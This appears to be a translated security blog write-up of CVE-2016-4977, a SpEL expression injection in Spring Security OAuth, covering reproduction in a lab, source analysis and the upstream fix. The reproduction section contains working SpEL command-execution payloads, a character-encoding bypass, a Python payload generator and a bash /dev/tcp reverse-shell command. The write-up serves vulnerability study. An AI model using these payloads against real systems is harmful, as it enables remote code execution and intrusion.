---
title: "[CVE-2016-4977] Spring Security OAuth RCE Vulnerability Study"
slug: oc1gdh
translationKey: oc1gdh
date: 2021-03-18T14:38:32+08:00
source: yuque/penetration
---

# 0x01   Background
> <font style="color:#3A4145;">Spring Security OAuth is a module that provides security authentication support for the Spring framework. On July 5, its maintainers published this</font> [upgrade announcement](https://pivotal.io/de/security/cve-2016-4977)<font style="color:#3A4145;">, which mainly explains that when users use</font> `Whitelabel views` <font style="color:#3A4145;">to handle errors, an attacker — once authorized — can remotely execute commands by crafting malicious parameters. The vulnerability's discoverer publicly released the</font> [discovery write-up](http://secalert.net/#CVE-2016-4977) <font style="color:#3A4145;">on October 13.</font>
>

<font style="color:#3A4145;">SpEL expression injection!</font>

## (1) Affected versions
`org.springframework.security.oauth` - `spring-security-oauth2`:

+ 2.0.0 to 2.0.9
+ <font style="background-color:transparent;">1.0.0 to 1.0.5</font>

I took a look at the [maven repository](https://mvnrepository.com/artifact/org.springframework.security.oauth/spring-security-oauth2) and found that `2.0.X` was released in February 2016, which means the vulnerability was discovered roughly half a year after release. From this we can also draw a conclusion: hackers are not watching official releases around the clock — in other words, real-world 0day vulnerabilities can always be found by you.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616050192115-71c5e652-c552-473b-9fd4-a35c44337e18.png)

And the entire `1.X` line is vulnerable.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616050222459-8fac82d5-7d54-49d8-87e7-3a1705464522.png)

# 0x02    Vulnerability Reproduction
## (1) A small snag
Since this is SpEL injection, let's try executing a command directly. Below is the result of attempting to run the id command:

```basic
${T(String).forName("java.lang.Runtime").getRuntime().exec('id')}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616050696478-178e31bc-db12-4714-b259-80ec57eff5ae.png)

Strange — there is no response echo, and it doesn't look like the execution succeeded. As for the specific reason, we will follow up during the later analysis; let's set that aside for now.

## (2) Bypass
Since for some reason we cannot execute commands directly, consider using ASCII codes to bypass, similar to `String.fromCharCode(65) => "A"` in `JS`:

```basic
T(java.lang.Character).toString(65)	=> 'A'
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616051157344-77e7be72-1208-4a5c-93d2-f8000f7eb44a.png)

Next, a command is more than one letter — the letters need to be concatenated one by one, using the `.concat()` function:

```basic
T(Character).toString(65).concat(T(Character).toString(66)) => 'AB'
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616051637822-76b44b8c-3aad-4488-b647-07f41f631e0a.png)

## (3) Exploit
Due to how the `exec` function in Java parses spaces, the reverse shell command needs to be transformed.

> Further reading
>
> + [Bypassing exec to get a reverse shell | Spoock](https://blog.spoock.com/2018/11/25/getshell-bypass-exec/)
> + [The correct way to invoke java.lang.Runtime.exec](https://blog.csdn.net/timo1160139211/article/details/75006938)
>

There are currently two simple and practical approaches. Method one: use `${IFS}` to replace the three spaces.

```basic
bash -c bash${IFS}-i${IFS}>&${IFS}/dev/tcp/127.0.0.1/443 0>&1
```

Method two: encode the command you want to execute [here](http://www.jackson-t.ca/runtime-exec-payloads.html).

After the encoding above, use the following [PoC.py](https://github.com/vulhub/vulhub/blob/master/spring/CVE-2016-4977/poc.py) to encode and send it:

```basic
#!/usr/bin/env python
# plz base64_encode the payload via {http://www.jackson-t.ca/runtime-exec-payloads.html}
payload

payload = input('Enter message to encode:')

poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(payload[0])

for ch in payload[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch) 
poc += ')}'
print(poc)
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616052939277-47b6845d-311a-4cde-9361-b126bc44f77d.png)

Send the payload, and the reverse shell succeeds.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616053786691-1529e008-84ee-4963-975b-5e812eb45adc.png)

## (4) PoC
Sometimes we don't need a reverse shell; we only need to prove that command execution is possible. Here is a PoC suitable for verification — it sleeps for 10 seconds.

```basic
${T(java.lang.Thread).sleep(10000)}
```

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1616052530491-2a71dfac-b068-4f37-baa2-a98834c8ee4a.png)

# 0x03    Vulnerability Analysis
Alright, we've finally reached everyone's favorite part: reading the code.

Following the "environment setup" steps in seebug's [article](https://paper.seebug.org/70/), download the source code from [http://secalert.net/research/cve-2016-4977.zip](http://secalert.net/research/cve-2016-4977.zip), import it into IDEA, and start debugging!

First, the basic flow:

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618476118383-6e378c72-5e5e-4bb6-aa0e-90e2a11c7a19.png)

One key-value pair inside the `error` variable is controllable, and then the constructor of `SpElView` is the key point.



![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618476294719-cfa33d98-5748-4b3f-af6c-54f046e789d3.png)



Recursively parsing `${}` expressions, as shown below: the code recursively parses multiple nested layers of expressions.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618499251301-40989fda-fa59-4677-8d07-b742575c2ac0.png)

The recursive `while` in the code...

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618500198678-0b81a02d-5107-46df-b42a-88f2368026a9.png)

Originally, the user's input is not a fully controllable expression; it looks like `${padding` + `USER_INPUT` + `padding}`.

But the problem is: on the one hand, the parsing rules recursively search for `${`; on the other hand, the user's input can also contain `${` — this allows an attacker to construct a complete SpEL expression and achieve RCE.



# 0x04    Fix
[https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d](https://github.com/spring-projects/spring-security-oauth/commit/fff77d3fea477b566bcacfbfc95f85821a2bdc2d)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618653600217-c3f98e70-d1b8-433c-b1bf-069de707ff22.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618653917312-4e1e993c-31a2-4ba9-8ca3-6b179cb88222.png)

The prefix is a randomly generated 6-digit random number.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618653759298-2826f79b-8510-4ecc-9fe9-91e4216072eb.png)

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618653486742-0c790d19-2839-44cd-9645-ecea75c81c9e.png)

In other words: every time a SpEL expression is parsed, a random "delimiter" — `random{` — is generated to replace the original `${`. Even with recursive parsing still in place, the attacker can no longer forge a delimiter for the parser to process.

However, since the random number is regenerated on every request, I personally don't think it can be brute-forced. I disagree with the brute-force view in seebug's [article](https://paper.seebug.org/70/#0x02).

# 0x05	Summary
At its core, this vulnerability is still a case of **the boundary between data and code being broken**. The user-controllable variable, originally treated as data — `$errorSummary` — gets parsed recursively; the parser should have guaranteed that the variable contains no `${`, otherwise an attacker can fully control the SpEL expression and thereby achieve command execution.

![](https://cdn.nlark.com/yuque/0/2021/png/166008/1618476294719-cfa33d98-5748-4b3f-af6c-54f046e789d3.png)

# Refs
1. [https://secalert.net/#CVE-2016-4977](https://secalert.net/#CVE-2016-4977)
2. [https://paper.seebug.org/70/](https://paper.seebug.org/70/)
3. [https://tanzu.vmware.com/de/security/cve-2016-4977](https://tanzu.vmware.com/de/security/cve-2016-4977)
4. Special thanks to vulhub for building the vulnerability reproduction environment [https://vulhub.org/#/environments/spring/CVE-2016-4977/](https://vulhub.org/#/environments/spring/CVE-2016-4977/)
